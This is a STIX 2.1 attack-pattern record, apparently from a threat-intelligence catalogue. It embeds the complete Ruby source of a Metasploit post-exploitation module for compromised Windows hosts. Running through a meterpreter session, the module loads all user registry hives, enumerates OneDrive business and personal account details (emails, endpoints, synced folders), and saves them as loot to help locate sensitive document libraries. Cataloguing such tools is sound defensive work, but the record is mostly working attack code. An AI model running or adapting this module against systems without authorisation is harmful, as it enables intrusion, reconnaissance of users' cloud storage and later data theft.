{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c32ab84e-f357-4391-bbc4-8e5c95571c4d",
    "created": "2024-08-14T16:33:05.043345Z",
    "modified": "2024-08-14T16:33:05.043349Z",
    "name": "OneDrive Sync Provider Enumeration Module",
    "description": " This module will identify the Office 365 OneDrive endpoints for both business and personal accounts across all users (providing access is permitted). It is useful for identifying document libraries that may otherwise not be obvious which could contain sensitive or useful information.  'License' => MSF_LICENSE 'Platform' => ['win'] 'SessionTypes' => ['meterpreter']",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/enum_onedrive.rb",
            "external_id": "enum_onedrive.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Common\n  include Msf::Post::File\n  include Msf::Post::Windows::Registry\n  include Msf::Post::Windows::UserProfiles\n\n  SYNC_ENGINES_KEYS = ['LibraryType', 'LastModifiedTime', 'MountPoint', 'UrlNamespace'].freeze\n  ONEDRIVE_ACCOUNT_KEYS = ['Business', 'ServiceEndpointUri', 'SPOResourceId', 'UserEmail', 'UserFolder', 'UserName'].freeze\n  PERSONAL_ONEDRIVE_KEYS = ['UserEmail', 'UserFolder'].freeze\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'OneDrive Sync Provider Enumeration Module',\n        'Description' => %q{\n          This module will identify the Office 365 OneDrive endpoints for both business and personal accounts\n          across all users (providing access is permitted). It is useful for identifying document libraries\n          that may otherwise not be obvious which could contain sensitive or useful information.\n        },\n        'License' => MSF_LICENSE,\n        'Platform' => ['win'],\n        'SessionTypes' => ['meterpreter'],\n        'Author' => ['Stuart Morgan <stuart.morgan[at]mwrinfosecurity.com>'],\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [IOC_IN_LOGS],\n          'Reliability' => []\n        }\n      )\n    )\n  end\n\n  def display_report(sid, info, sync_used, sync_all, results_table)\n    info.each do |key, result|\n      next if result['ScopeIdToMountPointPathCache'].nil? || result['ScopeIdToMountPointPathCache'].empty?\n\n      row = []\n      print_line\n      print_line \"  #{key}\"\n      print_line \"  #{'=' * key.length}\"\n      print_line\n      row << sid\n      row << key\n      ONEDRIVE_ACCOUNT_KEYS.each do |col|\n        row << result[col].to_s\n        if result['Business'] == '1' || PERSONAL_ONEDRIVE_KEYS.include?(col)\n          print_line \"    #{col}: #{result[col]}\"\n        end\n      end\n      result['ScopeIdToMountPointPathCache'].each do |scopes|\n        subrow = row.clone\n        print_line\n        SYNC_ENGINES_KEYS.each do |sync|\n          subrow << scopes[sync].to_s\n          print_line \"    | #{sync}: #{scopes[sync]}\"\n        end\n        results_table << subrow\n      end\n    end\n\n    sync_all_list = []\n    sync_all.each do |key, _result|\n      sync_all_list.push(key)\n    end\n\n    diff = sync_all_list - sync_used\n    if !(diff.nil? || diff.empty?)\n      print_line\n      print_line '  ORPHANED'\n      print_line '  ========'\n      diff.each do |scopeid|\n        csvrow = []\n        print_line\n        # Augment the CSV\n        csvrow << sid\n        csvrow << ''\n        ONEDRIVE_ACCOUNT_KEYS.each do |_od|\n          csvrow << ''\n        end\n        SYNC_ENGINES_KEYS.each do |sync|\n          csvrow << sync_all[scopeid][sync]\n          print_line \"  #{sync}: #{sync_all[scopeid][sync]}\"\n        end\n        results_table << csvrow\n      end\n    end\n  end\n\n  def get_syncengine_data(master, syncengines)\n    all_syncengines = {}\n    syncengines.each do |sync_provider| # Sync provider names are normally Personal for personal accounts\n      # or a hash value that is unique to each business account.\n      tmp_sync_provider_info = {}\n      SYNC_ENGINES_KEYS.each do |key|\n        tmp_sync_provider_info[key] = registry_getvaldata(\"#{master}\\\\#{sync_provider}\", key).to_s\n      end\n      all_syncengines[sync_provider] = tmp_sync_provider_info\n    end\n    all_syncengines\n  end\n\n  def get_onedrive_accounts(reg, accounts, syncdata)\n    all_oda = {}\n    synctargets_used = []\n    ret = {}\n    reg.each do |ses|\n      newses = {}\n      scopeids = registry_enumvals(\"#{accounts}\\\\#{ses}\\\\ScopeIdToMountPointPathCache\")\n      next if scopeids.nil? || scopeids.empty?\n\n      ONEDRIVE_ACCOUNT_KEYS.each do |key|\n        newses[key] = registry_getvaldata(\"#{accounts}\\\\#{ses}\", key).to_s\n      end\n\n      newses['ScopeIdToMountPointPathCache'] = []\n      scopeids.each do |sid|\n        target = syncdata[sid]\n        if newses['Business'] != '1'\n          target = syncdata['Personal']\n          synctargets_used.push('Personal')\n        else\n          synctargets_used.push(sid)\n        end\n        newses['ScopeIdToMountPointPathCache'].push(target)\n      end\n      all_oda[ses] = newses\n    end\n    ret['oda'] = all_oda\n    ret['synctargets_used'] = synctargets_used\n    ret\n  end\n\n  def run\n    # Obtain all user hives\n    userhives = load_missing_hives\n    got_results = false\n\n    # Prepare the results table\n    results_table = Rex::Text::Table.new(\n      'Header' => 'OneDrive Sync Information',\n      'Indent' => 1,\n      'SortIndex' => -1,\n      'Columns' => ['SID', 'Name'] + ONEDRIVE_ACCOUNT_KEYS + SYNC_ENGINES_KEYS\n    )\n\n    if userhives.nil? || userhives.empty?\n      fail_with(Failure::UnexpectedReply, 'Unable to load the missing hives needed to enumerate the target!')\n    end\n    # Loop through each of the hives\n    userhives.each do |hive|\n      next if hive['HKU'].nil?\n\n      print_status(\"Looking for OneDrive sync information for #{hive['SID']}\")\n      master_key = \"#{hive['HKU']}\\\\Software\\\\SyncEngines\\\\Providers\\\\OneDrive\"\n      saved_syncengines = registry_enumkeys(master_key)\n      if saved_syncengines.nil? || saved_syncengines.empty?\n        print_error(\"(#{hive['HKU']}) No OneDrive accounts found.\")\n        next\n      end\n\n      # Obtain the sync endpoints from the above subkey\n      all_syncengines = get_syncengine_data(master_key, saved_syncengines)\n\n      str_onedrive_accounts = \"#{hive['HKU']}\\\\Software\\\\Microsoft\\\\OneDrive\\\\Accounts\"\n      reg_onedrive_accounts = registry_enumkeys(str_onedrive_accounts)\n      if reg_onedrive_accounts.nil? || reg_onedrive_accounts.empty?\n        print_error(\"(#{hive['HKU']}) No OneDrive accounts found.\")\n        next\n      end\n\n      result = get_onedrive_accounts(reg_onedrive_accounts, str_onedrive_accounts, all_syncengines)\n\n      if result['oda'].nil? || result['oda'].empty?\n        print_error(\"(#{hive['HKU']}) No OneDrive accounts found.\")\n        next\n      end\n\n      got_results = true\n      print_good(\"OneDrive sync information for #{hive['SID']}\")\n      display_report(hive['SID'], result['oda'], result['synctargets_used'], all_syncengines, results_table)\n    end\n\n    print_line\n\n    if got_results\n      stored_path = store_loot('onedrive.syncinformation', 'text/csv', session, results_table.to_csv, 'onedrive_syncinformation.csv', 'OneDrive sync endpoints')\n      print_good(\"OneDrive sync information saved to #{stored_path} in CSV format.\")\n    end\n\n    # Clean up\n    unload_our_hives(userhives)\n  end\nend\n"
}